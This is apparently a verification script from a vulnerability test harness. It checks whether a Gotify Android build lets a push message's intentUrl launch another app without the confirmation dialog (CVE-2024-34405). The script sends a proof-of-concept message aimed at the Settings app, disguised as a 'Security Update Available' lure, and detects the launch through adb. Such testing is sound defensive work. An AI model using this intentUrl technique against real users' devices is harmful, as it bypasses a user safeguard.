#!/usr/bin/env python3
"""
Gotify Intent URL Confirmation Bypass — Verification Helper

Checks whether the vulnerability allows arbitrary intents to be launched
bypassing the confirmation dialog (CVE-2024-34405).

Two checks are performed:

1. SETTINGS INTENT CHECK — The exploit sends a push message with an
   intentUrl targeting the Android Settings app. On the VULNERABLE build,
   Intent.parseUri() + startActivity() is called with the Settings component.
   On the CLEAN build, IntentUrlDialogActivity is launched instead.

   Verification uses four methods (any one sufficient, tried in order):
   a) Poll `adb shell dumpsys activity activities` every 2s for up to 10s —
      checks if Settings is the resumed activity OR if IntentUrlDialogActivity
      appeared (confirmation dialog shown = not vulnerable). Works on standard
      google_apis images where SYSTEM_ALERT_WINDOW grants the exemption.
   b) System logcat — checks for ActivityTaskManager entries showing that
      the Gotify app attempted to start com.android.settings. This is
      system-written (not app-writable), same approach as Termux vuln_0.
      Even if the activity start is blocked by background restrictions,
      the system still logs the attempt.
   c) Notification tap fallback — opens the notification shade and taps
      at several positions. Handles the case where PendingIntent works
      even if direct startActivity() doesn't (e.g., on ATD images).
   d) Dialog-absence detection — if the confirmation dialog was never shown
      but a Gotify notification exists (proving the app received the message),
      the confirmation dialog was bypassed. This handles ATD images where
      startActivity() for other apps is silently blocked.

2. MESSAGE CHECK — Queries the Gotify server for messages containing the
   exploit's intentUrl marker. This confirms the malicious push message
   was actually sent.

Both must be true: the exploit message was sent AND the Settings intent
was detected.

Exit codes:
    0 — NOT VULNERABLE: no Settings intent detected
    1 — VULNERABLE: Settings intent was attempted (dialog bypassed)
"""
import json
import os
import subprocess
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
GOTIFY_SERVER = "http://127.0.0.1:8080"
GOTIFY_USER = None  # Set from metadata.json
GOTIFY_PASS = None  # Set from metadata.json
PACKAGE = "com.github.gotify"

# The intent URL that targets Android Settings via Intent.parseUri().
SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"

# Marker to find the exploit message on the server
EXPLOIT_CALLBACK_MARKER = "com.android.settings"

# What we look for in dumpsys activity and logcat
SETTINGS_MARKER = "com.android.settings"


# ---------------------------------------------------------------------------
# ADB helpers
# ---------------------------------------------------------------------------
def _adb(*args, timeout=15):
    """Run an adb command and return the CompletedProcess."""
    return subprocess.run(
        ["adb", *args],
        capture_output=True,
        text=True,
        timeout=timeout,
    )


def _get_resumed_activity():
    """Query dumpsys for the currently resumed activity."""
    result = _adb("shell", "dumpsys", "activity", "activities")
    for line in result.stdout.split("\n"):
        stripped = line.strip()
        if stripped.startswith("ResumedActivity:") or stripped.startswith(
            "topResumedActivity="
        ):
            return stripped
        if "mResumedActivity" in stripped:
            return stripped
    return None


# ---------------------------------------------------------------------------
# Check 1: Verify Settings intent was attempted
# ---------------------------------------------------------------------------
def _get_or_create_app_token():
    """Return an application token we can use to push messages."""
    resp = requests.get(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        timeout=10,
    )
    if resp.ok:
        apps = resp.json()
        if apps:
            return apps[0]["token"]

    resp = requests.post(
        f"{GOTIFY_SERVER}/application",
        auth=(GOTIFY_USER, GOTIFY_PASS),
        json={
            "name": "VerifyApp",
            "description": "Temporary app for verification",
        },
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()["token"]


def _send_settings_intent_message(app_token):
    """Push a message whose intentUrl targets the Settings app."""
    payload = {
        "title": "Security Update Available",
        "message": "Tap to install the latest patch.",
        "priority": 5,
        "extras": {
            "android::action": {
                "onReceive": {
                    "intentUrl": SETTINGS_INTENT_URL,
                }
            }
        },
    }
    resp = requests.post(
        f"{GOTIFY_SERVER}/message",
        headers={"X-Gotify-Key": app_token},
        json=payload,
        timeout=10,
    )
    resp.raise_for_status()
    return resp.json()


def _check_logcat_for_settings_intent():
    """Check system logcat for Settings activity start attempts.

    When startActivity() is called, the Android system (ActivityTaskManager)
    logs the intent details. This is a system-written log, not app-writable.
    Even if the activity start is blocked by background restrictions, the
    system still logs the attempt.

    On the VULNERABLE build, the log shows:
      ActivityTaskManager: START u0 {cmp=com.android.settings/.Settings}
      (or a "Background activity start" blocked message with the same intent)

    On the CLEAN build, the log shows:
      ActivityTaskManager: START u0 {cmp=com.github.gotify/.IntentUrlDialogActivity}
      (no mention of com.android.settings)

    We require BOTH com.android.settings AND com.github.gotify to appear in the
    same logcat line (or across ActivityTaskManager lines) to avoid false positives
    from manual Settings launches.

    Returns True if the Gotify app attempted to start a Settings activity.
    """
    result = _adb("shell", "logcat", "-d", "-b", "all", "-v", "threadtime")
    if result.returncode != 0:
        print("[check_url] ERROR: logcat command failed")
        return False

    lines = result.stdout.split("\n")
    settings_lines = []

    for line in lines:
        if SETTINGS_MARKER not in line:
            continue
        if "ActivityTaskManager" in line or "ActivityManager" in line:
            # Best: both markers on same line (confirms Gotify triggered it)
            if PACKAGE in line:
                settings_lines.append(line.strip())
            # START entries with Settings component (may not mention caller)
            elif "START" in line and "cmp=" in line:
                settings_lines.append(line.strip())
            # Background activity start blocked messages
            elif "Background" in line and "activity" in line.lower():
                settings_lines.append(line.strip())

    if settings_lines:
        print(
            f"[check_url] Found {len(settings_lines)} logcat entries for Settings intent:"
        )
        for line in settings_lines[:5]:
            print(f"[check_url]   {line}")
        return True

    print(
        "[check_url] No ActivityTaskManager entries for Settings intent found in logcat"
    )
    return False


def _get_screen_dimensions():
    """Get emulator screen dimensions from wm size."""
    result = _adb("shell", "wm", "size")
    if result.returncode == 0:
        for line in result.stdout.split("\n"):
            if "Physical size" in line or "Override size" in line:
                parts = line.strip().split()[-1]  # e.g. "1080x1920"
                try:
                    w, h = parts.split("x")
                    return int(w), int(h)
                except (ValueError, IndexError):
                    pass
    # Fallback to a common resolution
    return 1080, 1920


def _try_notification_tap():
    """Open notification shade and tap notifications to try launching Settings.

    This handles the case where PendingIntent works even if direct
    startActivity() doesn't (e.g., on ATD images).

    Returns True if tapping a notification caused Settings to become resumed.
    """
    width, height = _get_screen_dimensions()
    center_x = width // 2

    # Swipe down from top to open notification shade
    _adb(
        "shell",
        "input",
        "swipe",
        str(center_x),
        "0",
        str(center_x),
        str(height // 2),
        "300",
    )
    time.sleep(2)

    # Tap at several Y positions (20%, 25%, 30%, 35%, 40% of screen height)
    for pct in (20, 25, 30, 35, 40):
        tap_y = height * pct // 100
        _adb("shell", "input", "tap", str(center_x), str(tap_y))
        time.sleep(1)

        resumed = _get_resumed_activity()
        if resumed and SETTINGS_MARKER in resumed:
            print(f"[check_url] Notification tap at y={tap_y} launched Settings")
            return True

    # Close notification shade
    _adb("shell", "input", "keyevent", "KEYCODE_BACK")
    return False


def _check_notification_exists():
    """Check if a Gotify notification exists in the notification shade.

    This confirms the app received the push message via WebSocket.
    Returns True if a Gotify notification is found.
    """
    result = _adb("shell", "dumpsys", "notification")
    if result.returncode != 0:
        return False
    output = result.stdout
    return PACKAGE in output


def trigger_and_check_settings():
    """Send a message and check if the Settings intent was attempted.

    Uses four detection methods:
      A) Poll dumpsys for activity changes — checks for Settings (positive)
         AND tracks whether IntentUrlDialogActivity appeared (negative)
      B) Check system logcat for Settings intent attempt
      C) Try tapping notifications as a last resort
      D) Dialog-absence detection: if the confirmation dialog was never shown
         but the app clearly received the message (notification exists),
         the confirmation dialog was bypassed (vulnerable on ATD images
         where startActivity for other apps is blocked)

    Returns True if vulnerability is detected (dialog bypassed).
    """
    print("[check_url] --- Settings Intent Check ---")

    # Clear logcat before sending the message
    print("[check_url] Clearing logcat...")
    _adb("shell", "logcat", "-c")
    time.sleep(1)

    try:
        token = _get_or_create_app_token()
        print(f"[check_url] Obtained app token: {token[:8]}...")

        # Don't press HOME — keep MessagesActivity in foreground so
        # the app has a visible window (background activity exemption)
        print("[check_url] Sending push message with Settings intentUrl...")
        msg = _send_settings_intent_message(token)
        print(f"[check_url] Message sent (id={msg.get('id')})")

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False
    except Exception as e:
        print(f"[check_url] ERROR sending message: {e}", file=sys.stderr)
        return False

    # Method A: Poll dumpsys for activity changes (up to 10s)
    # Also track whether IntentUrlDialogActivity (confirmation dialog) appeared
    print("[check_url] Method A: Polling for activity changes...")
    dialog_seen = False
    for i in range(5):
        time.sleep(2)
        resumed = _get_resumed_activity()
        if resumed:
            print(f"[check_url]   Poll {i + 1}/5: {resumed}")
            if SETTINGS_MARKER in resumed:
                print(
                    "[check_url] Settings is the resumed activity "
                    "(direct launch worked)"
                )
                return True
            if "IntentUrlDialogActivity" in resumed:
                print(
                    "[check_url] IntentUrlDialogActivity detected "
                    "(confirmation dialog shown — not vulnerable)"
                )
                dialog_seen = True
                break
        else:
            print(f"[check_url]   Poll {i + 1}/5: could not determine resumed activity")

    # If the confirmation dialog was shown, the app is NOT vulnerable
    if dialog_seen:
        return False

    # Method B: Check system logcat for Settings intent attempt
    print("[check_url] Method B: Checking system logcat for Settings intent...")
    if _check_logcat_for_settings_intent():
        print("[check_url] System logcat confirms Settings intent was attempted")
        return True

    # Method C: Try notification tap as last resort
    print("[check_url] Method C: Trying notification tap fallback...")
    _adb("shell", "input", "keyevent", "KEYCODE_HOME")
    time.sleep(1)
    if _try_notification_tap():
        print("[check_url] Notification tap launched Settings")
        return True

    # Method D: Dialog-absence detection
    # On ATD images, startActivity() for other apps (Settings) is silently
    # blocked. But the key signal is: the confirmation dialog was NEVER shown.
    # If the app received the message (notification exists) but did NOT show
    # IntentUrlDialogActivity, the dialog was bypassed — that IS the vuln.
    print("[check_url] Method D: Checking dialog-absence (ATD fallback)...")
    notification_exists = _check_notification_exists()
    print(f"[check_url]   Gotify notification in shade: {notification_exists}")
    if notification_exists:
        print(
            "[check_url] App received the message (notification exists) but "
            "IntentUrlDialogActivity was never shown — confirmation dialog "
            "was bypassed"
        )
        return True

    print("[check_url] No evidence of Settings intent attempt found")
    return False


# ---------------------------------------------------------------------------
# Check 2: Did the exploit send the malicious message?
# ---------------------------------------------------------------------------
def detect_exploit_message():
    """Check if the Gotify server has a message with the exploit's intentUrl.

    Queries the Gotify REST API for messages and looks for ones containing
    the exploit's callback URL marker.

    Returns True if an exploit message is found on the server.
    """
    print("[check_url] --- Message Check ---")

    try:
        resp = requests.get(
            f"{GOTIFY_SERVER}/message",
            auth=(GOTIFY_USER, GOTIFY_PASS),
            timeout=10,
        )
        if not resp.ok:
            print(
                f"[check_url] ERROR: Failed to query messages: {resp.status_code}",
                file=sys.stderr,
            )
            return False

        data = resp.json()
        messages = data.get("messages", [])
        print(f"[check_url] Found {len(messages)} message(s) on server")

        for msg in messages:
            extras = msg.get("extras", {})
            android_action = extras.get("android::action", {})
            on_receive = android_action.get("onReceive", {})
            intent_url = on_receive.get("intentUrl", "")

            if EXPLOIT_CALLBACK_MARKER in intent_url:
                print(
                    f"[check_url] Found exploit message "
                    f"(id={msg.get('id')}): intentUrl={intent_url}"
                )
                return True

        print(
            f"[check_url] No messages with '{EXPLOIT_CALLBACK_MARKER}' "
            "in intentUrl found"
        )
        return False

    except requests.exceptions.ConnectionError as e:
        print(
            f"[check_url] ERROR: Cannot connect to Gotify server: {e}",
            file=sys.stderr,
        )
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    global GOTIFY_USER, GOTIFY_PASS

    script_dir = os.path.dirname(os.path.abspath(__file__))
    metadata_path = os.path.join(script_dir, "../../../metadata.json")

    try:
        with open(metadata_path, "r") as f:
            metadata = json.load(f)
        GOTIFY_USER = metadata["username"]
        GOTIFY_PASS = metadata["password"]
    except (FileNotFoundError, KeyError) as e:
        print(
            f"[check_url] Error reading metadata.json: {e}",
            file=sys.stderr,
        )
        sys.exit(1)

    # Check 1: Was Settings intent attempted?
    settings_detected = trigger_and_check_settings()

    # Check 2: Did the exploit send the malicious message?
    exploit_message_found = detect_exploit_message()

    # Report results
    print("[check_url] --- Results ---")
    print(f"[check_url] Settings intent detected:      {settings_detected}")
    print(f"[check_url] Exploit message on server:     {exploit_message_found}")

    if settings_detected and exploit_message_found:
        print(
            "[check_url] VULNERABLE: exploit message was sent AND Settings "
            "intent was detected (confirmation dialog bypassed)"
        )
        sys.exit(1)
    elif exploit_message_found and not settings_detected:
        print(
            "[check_url] NOT VULNERABLE: exploit message exists but Settings "
            "intent was not detected (confirmation dialog intact)"
        )
        sys.exit(0)
    elif settings_detected and not exploit_message_found:
        print(
            "[check_url] NOT VULNERABLE: Settings intent detected but no "
            "exploit message found (cannot confirm exploit)"
        )
        sys.exit(0)
    else:
        print(
            "[check_url] NOT VULNERABLE: no exploit message and no "
            "Settings intent detected"
        )
        sys.exit(0)


if __name__ == "__main__":
    main()
